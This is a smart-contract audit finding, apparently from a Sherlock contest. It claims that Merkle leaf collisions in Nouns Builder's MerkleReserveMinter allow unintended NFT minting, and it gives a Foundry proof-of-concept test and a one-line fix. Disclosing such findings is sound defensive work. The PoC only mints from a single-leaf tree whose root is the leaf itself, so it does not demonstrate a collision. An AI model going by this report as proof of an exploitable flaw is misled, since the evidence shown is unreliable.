Puny Flint Pony

medium

# Merkle leaf values for MerkleMinterSettings.merkleRoot are 64 bytes before hashing, vulnerable to merkle tree collisions.

## Summary
The input of keccak256 function is 64 bytes long, so it can lead to unintended minting from `MerkleReserveMinter.mintFromReserve`.

## Vulnerability Detail
If the left merkle node has 12 leading zeros and the right merkle node is under the reserved, left and right nodes can
be mistaken for `minter` and `tokenId`.
Add the code below in `test/MerkleReserveMinter.t.sol` and run `forge test --mt test_POC1`.

```solidity
    // @audit It is a potential trap to set the total length of keccak256 function inputs as 64 bytes.
    // The intermediate merkle nodes are also 32 bytes, so unluckily, left and right nodes can be mistaken for `minter` and `tokenId`.
    // MerkleTree Example
    //    root
    //    / \
    // 0xC3  1
    // This is a modified test of test_MintFlowWithValue.
    function test_POC1() public {
        deployAltMock(20);

        address alice = address(0xC3);

        // Both are same.
        // bytes32 root = bytes32(0xa718fbd65f9e9f6c5506566b1c70eac0a04cfeba6e444cecdb4cda0272f03e68);
        bytes32 root = keccak256(abi.encode(alice, uint256(1)));

        MerkleReserveMinter.MerkleMinterSettings memory settings = MerkleReserveMinter.MerkleMinterSettings({
            mintStart: 0,
            mintEnd: uint64(block.timestamp + 1000),
            pricePerToken: 0.5 ether,
            merkleRoot: root
        });

        vm.prank(address(founder));
        minter.setMintSettings(address(token), settings);

        TokenTypesV2.MinterParams memory params = TokenTypesV2.MinterParams({ minter: address(minter), allowed: true });
        TokenTypesV2.MinterParams[] memory minters = new TokenTypesV2.MinterParams[](1);
        minters[0] = params;
        vm.prank(address(founder));
        token.updateMinters(minters);

        bytes32[] memory proof = new bytes32[](0);

        MerkleReserveMinter.MerkleClaim[] memory claims = new MerkleReserveMinter.MerkleClaim[](1);
        claims[0] = MerkleReserveMinter.MerkleClaim({ mintTo: alice, tokenId: 1, merkleProof: proof });

        uint256 fees = minter.getTotalFeesForMint(address(token), claims.length);
        vm.deal(claimer1, fees);

        vm.prank(claimer1);
        minter.mintFromReserve{ value: fees }(address(token), claims);

        assertEq(token.ownerOf(1), alice);
        assertEq(address(treasury).balance, fees - minter.BUILDER_DAO_FEE());
    }
```

It is similar with this finding.
https://audits.sherlock.xyz/contests/71/report#issue-m-5-merkle-leaf-values-for-_clubdivsmerkleroot-are-64-bytes-before-hashing-which-can-lead-to-merkle-tree-collisions

## Impact
Unintended minting of NFTs.

## Code Snippet
https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/minters/MerkleReserveMinter.sol#L160

## Tool used
Manual Review and foundry tests.

## Recommendation
Update [`MerkleReserveMinter.mintFromReserve`](https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/minters/MerkleReserveMinter.sol#L160) as below.
`abi.encodePacked(claim.mintTo, claim.tokenId)` is 20 + 32 = 52 bytes long and this vulnerability is only valid for 64 bytes long inputs of keccak256.
```diff
-                if (!MerkleProof.verify(claim.merkleProof, settings.merkleRoot, keccak256(abi.encode(claim.mintTo, claim.tokenId)))) {
+                if (!MerkleProof.verify(claim.merkleProof, settings.merkleRoot, keccak256(abi.encodePacked(claim.mintTo, claim.tokenId)))) {
```
